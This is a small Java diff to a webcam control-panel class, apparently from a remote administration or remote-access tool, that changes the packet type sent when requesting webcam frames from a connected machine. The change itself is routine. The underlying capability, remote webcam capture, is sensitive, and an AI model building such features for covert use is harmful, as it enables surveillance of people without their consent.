@@ -71,7 +71,7 @@ public class PanelWebcam extends BaseControlPanel {
 						public void run() {
 							try {
 								while (true) {
-									getServer().addToSendQueue(new Packet(getServer()));
+									getServer().addToSendQueue(new Packet120Webcam(getServer()));
 									
 									if (!WebcamPlugin.enabled) {
 										return;
@@ -190,7 +190,7 @@ public class PanelWebcam extends BaseControlPanel {
 		try {
 			WebcamPlugin.enabled = false;
 			Thread.sleep((long) (Integer) spInterval.getValue());
-			getServer().addToSendQueue(new Packet(getServer()));
+			getServer().addToSendQueue(new Packet120Webcam(getServer()));
 		} catch (Exception e) {					
 			e.printStackTrace();
 		}	
